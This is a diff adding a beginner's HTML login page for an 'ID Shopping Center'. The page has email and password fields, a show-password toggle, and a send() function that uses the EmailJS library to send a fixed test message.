@@ -1,0 +1,97 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>ID Shopping Center</title>
+    
+    <link rel="stylesheet" href="form.css">
+    
+    <style>
+#error{
+    color:rgb(228, 20, 20);
+}
+</style>
+</head>
+<body>
+    
+    <h1 class="aribiah">Shopping Form</h1>
+
+    <div id="form-body">
+        <div>
+            <h4>Log in</h4>
+        </div>
+    <div id="error"></div>
+        <form action="" id="form">
+         <input type="text" placeholder="Email address or Phone number" id="email" required> <br>  
+         <input type="password" placeholder="Password" id="Password" required> <br>
+         <button id="butt" onclick="myFunction()">Log in</button>  <br>
+         <input type="checkbox" onclick="OurFunction()">
+            <div class="pass">
+                <a href="">Forgotten Password?</a>
+            </div>
+         
+          
+        </form>
+        <div class="line-con">
+            <div class="line"></div>
+            <p>or</p>
+            <div class="line"></div>
+        </div>
+        <button class="btn">Creat new account</button> 
+        <a href="https://mail.google.com/mail/u/0/#inbox/FMfcgzQcpKlPJgxRBfwtDhWNPxlBgqCQ?compose=new">purechase</a>         
+    </div>
+<button onclick="send()"></button>
+    <script type="text/javascript" src="script.js"></script>
+<script type="text/javascript"
+        src="https://cdn.jsdelivr.net/npm/@emailjs/browser@4/dist/email.min.js"></script>
+    
+<script>
+function OurFunction() {
+  var x = document.getElementById("Password");
+  if (x.type === "password") {
+    x.type = "text";
+  } else {
+    x.type = "password";
+  }
+}
+
+function send(){
+var templateParams = {
+  name: 'James',
+  notes: 'Check this out!',
+};
+
+emailjs.send("service_7soqr7z","template_72i8i5a", templateParams).then(
+  (response) => {
+    console.log('SUCCESS!', response.status, response.text);
+  },
+  (error) => {
+    console.log('FAILED...', error);
+  },
+);
+
+ emailjs.init({
+  publicKey: 'g4ThOoApeX7_a5KEx',
+  // Do not allow headless browsers
+  blockHeadless: true,
+  blockList: {
+    // Block the suspended emails
+    list: ['idorenyinmfon2@gmail.com'],
+    // The variable contains the email address
+    watchVariable: 'userEmail',
+  },
+  limitRate: {
+    // Set the limit rate for the application
+    id: 'app',
+    // Allow 1 request per 10s
+    throttle: 10000,
+  },
+});
+
+
+   }
+</script>
+  <script src="script.js"></script>  
+</body>
+</html>
